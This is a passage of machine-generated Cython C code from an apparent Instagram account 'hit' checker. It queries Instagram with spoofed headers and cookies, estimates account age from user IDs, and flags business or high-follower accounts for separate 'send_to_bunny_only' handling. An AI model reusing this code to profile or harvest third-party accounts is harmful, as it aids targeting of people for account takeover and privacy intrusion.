      __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_6);
      PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_6);
      __pyx_t_6 = 0;
      __Pyx_INCREF(__pyx_kp_u__23);
      __pyx_t_9 += 1;
      __Pyx_GIVEREF(__pyx_kp_u__23);
      PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u__23);
      __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_5, 3, __pyx_t_9, __pyx_t_10); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 247, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_referer, __pyx_t_6) < 0) __PYX_ERR(0, 245, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_user_agent, __pyx_kp_u_Mozilla_5_0_Windows_NT_10_0_Win6) < 0) __PYX_ERR(0, 245, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_app_id, __pyx_kp_u_936619743392459) < 0) __PYX_ERR(0, 245, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_requested_with, __pyx_n_u_XMLHttpRequest) < 0) __PYX_ERR(0, 245, __pyx_L3_error)
      __pyx_v_headers = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 251, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_username, __pyx_v_username) < 0) __PYX_ERR(0, 251, __pyx_L3_error)
      __pyx_v_params = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_requests); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 252, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 252, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 254, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_params, __pyx_v_params) < 0) __PYX_ERR(0, 254, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_cookies, __pyx_v_cookies) < 0) __PYX_ERR(0, 254, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 254, __pyx_L3_error)

      
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__24, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 252, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_response = __pyx_t_5;
      __pyx_t_5 = 0;

      
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_11, &__pyx_t_12, &__pyx_t_13);
        __Pyx_XGOTREF(__pyx_t_11);
        __Pyx_XGOTREF(__pyx_t_12);
        __Pyx_XGOTREF(__pyx_t_13);
        /*try:*/ {

          
          __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_json); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 258, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_6 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
            }
          }
          __pyx_t_5 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 258, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          
          __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_u_data); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 259, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_u_user); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 259, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_u_is_business_account); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 259, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_v_is_business = __pyx_t_4;
          __pyx_t_4 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        goto __pyx_L15_try_end;
        __pyx_L10_error:;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

        
        __pyx_t_14 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
        if (__pyx_t_14) {
          __Pyx_AddTraceback("source.bunnyiginfo", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_5, &__pyx_t_6) < 0) __PYX_ERR(0, 260, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_GOTREF(__pyx_t_6);

          
          __Pyx_INCREF(Py_False);
          __Pyx_XDECREF_SET(__pyx_v_is_business, Py_False);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          goto __pyx_L11_exception_handled;
        }
        goto __pyx_L12_except_error;
        __pyx_L12_except_error:;

        
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
        goto __pyx_L3_error;
        __pyx_L11_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
        __pyx_L15_try_end:;
      }

      
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_user_data, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 262, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__25, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 262, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_followers = __pyx_t_5;
      __pyx_t_5 = 0;

      
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_13, &__pyx_t_12, &__pyx_t_11);
        __Pyx_XGOTREF(__pyx_t_13);
        __Pyx_XGOTREF(__pyx_t_12);
        __Pyx_XGOTREF(__pyx_t_11);
        /*try:*/ {

          
          __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_user_data, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 267, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_15 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__26, NULL); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 267, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_15);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          
          __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_15); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 266, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;

          
          __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_isdigit); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 268, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_15);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_4 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_15))) {
            __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_15);
            if (likely(__pyx_t_4)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_15);
              __Pyx_INCREF(__pyx_t_4);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_15, function);
            }
          }
          __pyx_t_6 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_15, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_15);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 268, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          __pyx_t_8 = __Pyx_PyObject_IsTrue(__pyx_t_6); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 268, __pyx_L18_error)
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (__pyx_t_8) {

            
            __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_user_data, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 265, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_15 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__26, NULL); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 265, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_15);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

            
            __pyx_t_6 = __Pyx_PyNumber_Int(__pyx_t_15); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 264, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
            __pyx_t_5 = __pyx_t_6;
            __pyx_t_6 = 0;
          } else {
            __Pyx_INCREF(__pyx_int_0);
            __pyx_t_5 = __pyx_int_0;
          }
          __pyx_v_user_id = __pyx_t_5;
          __pyx_t_5 = 0;

          
          __pyx_t_5 = PyObject_RichCompare(__pyx_int_1, __pyx_v_user_id, Py_LE); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 269, __pyx_L18_error)
          if (__Pyx_PyObject_IsTrue(__pyx_t_5)) {
            __Pyx_DECREF(__pyx_t_5);
            __pyx_t_5 = PyObject_RichCompare(__pyx_v_user_id, __pyx_int_1279000, Py_LT); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 269, __pyx_L18_error)
          }
          __pyx_t_8 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 269, __pyx_L18_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (__pyx_t_8) {

            
            __Pyx_INCREF(__pyx_kp_u_2010);
            __pyx_v_account_year = __pyx_kp_u_2010;

            
            goto __pyx_L24;
          }

          
          __pyx_t_5 = PyObject_RichCompare(__pyx_int_1279001, __pyx_v_user_id, Py_LE); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 271, __pyx_L18_error)
          if (__Pyx_PyObject_IsTrue(__pyx_t_5)) {
            __Pyx_DECREF(__pyx_t_5);
            __pyx_t_5 = PyObject_RichCompare(__pyx_v_user_id, __pyx_int_17750000, Py_LT); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 271, __pyx_L18_error)
          }
          __pyx_t_8 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 271, __pyx_L18_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (__pyx_t_8) {

            
            __Pyx_INCREF(__pyx_kp_u_2011);
            __pyx_v_account_year = __pyx_kp_u_2011;

            
            goto __pyx_L24;
          }

          
          __pyx_t_5 = PyObject_RichCompare(__pyx_int_17750001, __pyx_v_user_id, Py_LE); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 273, __pyx_L18_error)
          if (__Pyx_PyObject_IsTrue(__pyx_t_5)) {
            __Pyx_DECREF(__pyx_t_5);
            __pyx_t_5 = PyObject_RichCompare(__pyx_v_user_id, __pyx_int_279760000, Py_LT); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 273, __pyx_L18_error)
          }
          __pyx_t_8 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 273, __pyx_L18_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (__pyx_t_8) {

            
            __Pyx_INCREF(__pyx_kp_u_2012);
            __pyx_v_account_year = __pyx_kp_u_2012;

            
            goto __pyx_L24;
          }

          
          __pyx_t_5 = PyObject_RichCompare(__pyx_int_279760001, __pyx_v_user_id, Py_LE); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 275, __pyx_L18_error)
          if (__Pyx_PyObject_IsTrue(__pyx_t_5)) {
            __Pyx_DECREF(__pyx_t_5);
            __pyx_t_5 = PyObject_RichCompare(__pyx_v_user_id, __pyx_int_900990000, Py_LT); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 275, __pyx_L18_error)
          }
          __pyx_t_8 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 275, __pyx_L18_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (__pyx_t_8) {

            
            __Pyx_INCREF(__pyx_kp_u_2013);
            __pyx_v_account_year = __pyx_kp_u_2013;

            
            goto __pyx_L24;
          }

          
          __pyx_t_5 = PyObject_RichCompare(__pyx_int_900990001, __pyx_v_user_id, Py_LE); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 277, __pyx_L18_error)
          if (__Pyx_PyObject_IsTrue(__pyx_t_5)) {
            __Pyx_DECREF(__pyx_t_5);
            __pyx_t_5 = PyObject_RichCompare(__pyx_v_user_id, __pyx_int_1629010000, Py_LT); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 277, __pyx_L18_error)
          }
          __pyx_t_8 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 277, __pyx_L18_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (__pyx_t_8) {

            
            __Pyx_INCREF(__pyx_kp_u_2014);
            __pyx_v_account_year = __pyx_kp_u_2014;

            
            goto __pyx_L24;
          }

          
          __pyx_t_5 = PyObject_RichCompare(__pyx_int_1900000000, __pyx_v_user_id, Py_LE); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 279, __pyx_L18_error)
          if (__Pyx_PyObject_IsTrue(__pyx_t_5)) {
            __Pyx_DECREF(__pyx_t_5);
            __pyx_t_5 = PyObject_RichCompare(__pyx_v_user_id, __pyx_int_2500000000, Py_LT); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 279, __pyx_L18_error)
          }
          __pyx_t_8 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 279, __pyx_L18_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (__pyx_t_8) {

            
            __Pyx_INCREF(__pyx_kp_u_2015);
            __pyx_v_account_year = __pyx_kp_u_2015;

            
            goto __pyx_L24;
          }

          
          __pyx_t_5 = PyObject_RichCompare(__pyx_int_2500000000, __pyx_v_user_id, Py_LE); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 281, __pyx_L18_error)
          if (__Pyx_PyObject_IsTrue(__pyx_t_5)) {
            __Pyx_DECREF(__pyx_t_5);
            __pyx_t_5 = PyObject_RichCompare(__pyx_v_user_id, __pyx_int_3713668786, Py_LT); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 281, __pyx_L18_error)
          }
          __pyx_t_8 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 281, __pyx_L18_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (__pyx_t_8) {

            
            __Pyx_INCREF(__pyx_kp_u_2016);
            __pyx_v_account_year = __pyx_kp_u_2016;

            
            goto __pyx_L24;
          }

          
          __pyx_t_5 = PyObject_RichCompare(__pyx_int_3713668786, __pyx_v_user_id, Py_LE); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 283, __pyx_L18_error)
          if (__Pyx_PyObject_IsTrue(__pyx_t_5)) {
            __Pyx_DECREF(__pyx_t_5);
            __pyx_t_5 = PyObject_RichCompare(__pyx_v_user_id, __pyx_int_5699785217, Py_LT); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 283, __pyx_L18_error)
          }
          __pyx_t_8 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 283, __pyx_L18_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (__pyx_t_8) {

            
            __Pyx_INCREF(__pyx_kp_u_2017);
            __pyx_v_account_year = __pyx_kp_u_2017;

            
            goto __pyx_L24;
          }

          
          __pyx_t_5 = PyObject_RichCompare(__pyx_int_5699785217, __pyx_v_user_id, Py_LE); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 285, __pyx_L18_error)
          if (__Pyx_PyObject_IsTrue(__pyx_t_5)) {
            __Pyx_DECREF(__pyx_t_5);
            __pyx_t_5 = PyObject_RichCompare(__pyx_v_user_id, __pyx_int_8507940634, Py_LT); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 285, __pyx_L18_error)
          }
          __pyx_t_8 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 285, __pyx_L18_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (__pyx_t_8) {

            
            __Pyx_INCREF(__pyx_kp_u_2018);
            __pyx_v_account_year = __pyx_kp_u_2018;

            
            goto __pyx_L24;
          }

          
          __pyx_t_5 = PyObject_RichCompare(__pyx_int_8507940634, __pyx_v_user_id, Py_LE); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 287, __pyx_L18_error)
          if (__Pyx_PyObject_IsTrue(__pyx_t_5)) {
            __Pyx_DECREF(__pyx_t_5);
            __pyx_t_5 = PyObject_RichCompare(__pyx_v_user_id, __pyx_int_21254029834, Py_LT); __Pyx_XGOTREF(__pyx_t_5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 287, __pyx_L18_error)
          }
          __pyx_t_8 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 287, __pyx_L18_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (__pyx_t_8) {

            
            __Pyx_INCREF(__pyx_kp_u_2019);
            __pyx_v_account_year = __pyx_kp_u_2019;

            
            goto __pyx_L24;
          }

          
          /*else*/ {
            __Pyx_INCREF(__pyx_kp_u_2020_2023);
            __pyx_v_account_year = __pyx_kp_u_2020_2023;
          }
          __pyx_L24:;

          
        }
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        goto __pyx_L23_try_end;
        __pyx_L18_error:;
        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

        
        __pyx_t_14 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
        if (__pyx_t_14) {
          __Pyx_AddTraceback("source.bunnyiginfo", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_15) < 0) __PYX_ERR(0, 291, __pyx_L20_except_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_GOTREF(__pyx_t_15);

          
          __Pyx_INCREF(__pyx_n_u_Unknown);
          __Pyx_XDECREF_SET(__pyx_v_account_year, __pyx_n_u_Unknown);
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          goto __pyx_L19_exception_handled;
        }
        goto __pyx_L20_except_error;
        __pyx_L20_except_error:;

        
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_ExceptionReset(__pyx_t_13, __pyx_t_12, __pyx_t_11);
        goto __pyx_L3_error;
        __pyx_L19_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_ExceptionReset(__pyx_t_13, __pyx_t_12, __pyx_t_11);
        __pyx_L23_try_end:;
      }

      
      __pyx_t_7 = __Pyx_PyObject_IsTrue(__pyx_v_is_business); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 293, __pyx_L3_error)
      if (!__pyx_t_7) {
      } else {
        __pyx_t_8 = __pyx_t_7;
        goto __pyx_L28_bool_binop_done;
      }
      __pyx_t_15 = PyObject_RichCompare(__pyx_v_followers, __pyx_int_100, Py_GT); __Pyx_XGOTREF(__pyx_t_15); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 293, __pyx_L3_error)
      __pyx_t_7 = __Pyx_PyObject_IsTrue(__pyx_t_15); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 293, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
      __pyx_t_8 = __pyx_t_7;
      __pyx_L28_bool_binop_done:;
      if (__pyx_t_8) {

        
        __pyx_v_send_to_bunny_only = 1;

        
        __Pyx_INCREF(__pyx_n_u_True);
        __pyx_v_header = __pyx_n_u_True;

        
        goto __pyx_L27;
      }

      
      /*else*/ {
        __pyx_v_send_to_bunny_only = 0;

        
        __Pyx_INCREF(__pyx_n_u_False);
        __pyx_v_header = __pyx_n_u_False;

        
        __Pyx_GetModuleGlobalName(__pyx_t_15, __pyx_n_s_hit_dustu); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 299, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_15);
        __pyx_t_6 = __Pyx_PyInt_AddObjC(__pyx_t_15, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 299, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_hit_dustu, __pyx_t_6) < 0) __PYX_ERR(0, 299, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      }
      __pyx_L27:;

      
      __pyx_t_6 = PyTuple_New(25); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_9 = 0;
      __pyx_t_10 = 127;
      __Pyx_INCREF(__pyx_kp_u_NAME);
      __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
      __pyx_t_9 += 56;
      __Pyx_GIVEREF(__pyx_kp_u_NAME);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_kp_u_NAME);
      __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_v_user_data, __pyx_n_s_get); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_15, __pyx_tuple__27, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
      __pyx_t_15 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) : __pyx_t_10;
      __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_15);
      __Pyx_GIVEREF(__pyx_t_15);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_15);
      __pyx_t_15 = 0;
      __Pyx_INCREF(__pyx_kp_u_USERNAME);
      __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
      __pyx_t_9 += 20;
      __Pyx_GIVEREF(__pyx_kp_u_USERNAME);
      PyTuple_SET_ITEM(__pyx_t_6, 2, __pyx_kp_u_USERNAME);
      __pyx_t_15 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) : __pyx_t_10;
      __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_15);
      __Pyx_GIVEREF(__pyx_t_15);
      PyTuple_SET_ITEM(__pyx_t_6, 3, __pyx_t_15);
      __pyx_t_15 = 0;
      __Pyx_INCREF(__pyx_kp_u_EMAIL);
      __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
      __pyx_t_9 += 20;
      __Pyx_GIVEREF(__pyx_kp_u_EMAIL);
      PyTuple_SET_ITEM(__pyx_t_6, 4, __pyx_kp_u_EMAIL);
      __pyx_t_15 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
